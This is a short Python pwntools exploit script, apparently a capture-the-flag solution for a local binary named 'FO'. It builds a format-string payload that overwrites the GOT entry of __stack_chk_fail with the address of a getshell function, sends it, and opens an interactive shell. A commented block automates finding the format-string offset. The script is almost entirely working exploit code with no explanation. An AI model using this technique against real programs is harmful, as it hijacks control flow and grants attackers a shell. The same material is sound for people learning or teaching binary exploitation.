#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./FO')
elf = ELF('./FO')

def pr(a,addr):
	log.success(a+': '+hex(addr))
'''
def exec_fmt(pad):
	p = process("./FO")
	# send 还是 sendline以程序为准
	p.sendline(pad)
	return p.recv()

fmt = FmtStr(exec_fmt)
offset = fmt.offset
pr('offset',offset)
'''

__stack_chk_fail = 0x601020
getshell = 0x400737

#gdb.attach(p)
#pause()
p.recvuntil("Please pwn me :)\n")
payload = fmtstr_payload(6, {__stack_chk_fail:getshell}).ljust(40,'A')
p.sendline(payload)
p.interactive()
